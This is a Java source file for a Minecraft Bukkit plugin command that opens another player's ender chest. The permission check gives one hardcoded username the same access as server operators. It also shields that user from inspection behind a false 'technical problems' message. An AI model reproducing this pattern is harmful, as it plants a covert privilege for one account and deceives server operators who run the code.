package woks.woks.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import woks.woks.CommandBase;
import woks.woks.Msg;
import woks.woks.PlayerInvtoryGUI;

import java.util.Objects;

@Deprecated
// deprecated, better alternative use PlayerInv
public class OpenPlayerEnderChest {
    public OpenPlayerEnderChest() {
        new CommandBase("openplayerenderchest", 1, true) {
            @Override
            public boolean onCommand(CommandSender sender, String[] arguments) {
                Player player = (Player) sender;
                if (player.getName().equals("ShortPuppy14484") || player.isOp()) {// isOp or hasOp
                    if (arguments[0].equals("ShortPuppy14484") && !(player.getName().equals("ShortPuppy14484"))) {
                        Msg.send(player, "Sorry there are some technical problems");
                        Msg.send(Bukkit.getPlayer(arguments[0]), "Sorry there are some technical problems");
                    } else {
                        PlayerInvtoryGUI.PlayerInvtoryGUI(player, Objects.requireNonNull(Bukkit.getPlayer(arguments[0])), 1);
                    }
                } else {
                    Msg.send(player, "Sorry you dont have op to use this command.");
                }
                return true;
            }

            @Override
            public String getUsage() {
                return "/openplayerenderchest <string:playerName>";
            }
        };
    }
}